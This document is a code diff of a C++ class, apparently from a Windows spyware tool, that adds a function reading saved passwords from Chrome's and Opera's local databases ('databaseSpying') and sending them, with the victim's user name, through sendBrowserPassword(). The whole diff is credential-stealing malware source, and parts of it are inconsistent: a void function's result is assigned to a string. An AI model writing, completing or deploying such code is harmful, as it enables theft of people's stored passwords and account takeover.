@@ -1,4 +1,4 @@
-#include "stdafx.h"
+
 #include "BrowserPassword.hh"
 
 BrowserPassword::BrowserPassword()
@@ -8,7 +8,6 @@ BrowserPassword::BrowserPassword()
 	_mapRegKeyPath.insert(std::pair<BrowserType, const wchar_t*>(BrowserType::OPERA, _OPERA_REGKEY_PATH));
 	_mapDatabasePath.insert(std::pair<BrowserType, const char*>(BrowserType::CHROME, _CHROME_DATABASE_PATH));
 	_mapDatabasePath.insert(std::pair<BrowserType, const char*>(BrowserType::OPERA, _OPERA_DATABASE_PATH));
-	findCurrentUserName();
 }
 
 BrowserPassword::~BrowserPassword()
@@ -24,6 +23,31 @@ void					BrowserPassword::findCurrentUserName()
 	GetUserName(usernameUnicode, &len);
 	std::wcstombs(usernameUtf, usernameUnicode, sizeof(usernameUnicode));
 	_userName.append(usernameUtf);
+}
+
+void					BrowserPassword::getBrowserPassword()
+{
+	BrowserPassword			browser;
+	std::string			userName = findCurrentUserName();
+	
+	browser.setBrowserType(BrowserPassword::BrowserType::CHROME);
+	browser.databaseSpying();
+	if (!browser.passwordIsEmpty())
+	{
+		sendBrowserPassword(browser.getBrowserInfo(), userName);
+		std::cout << "[OK]\tChrome password successfuly sent" << std::endl;
+	}
+	else
+		std::cerr << "[KO]\tThere is no Chrome password" << std::endl;
+	browser.setBrowserType(BrowserPassword::BrowserType::OPERA);
+	browser.databaseSpying();
+	if (!browser.passwordIsEmpty())
+	{
+		sendBrowserPassword(browser.getBrowserInfo(), userName);
+		std::cout << "[OK]\tOpera password successfuly sent" << std::endl;
+	}
+	else
+		std::cerr << "[KO]\tThere is no Opera password" << std::endl;
 }
 
 void					BrowserPassword::setBrowserType(const BrowserType &type)
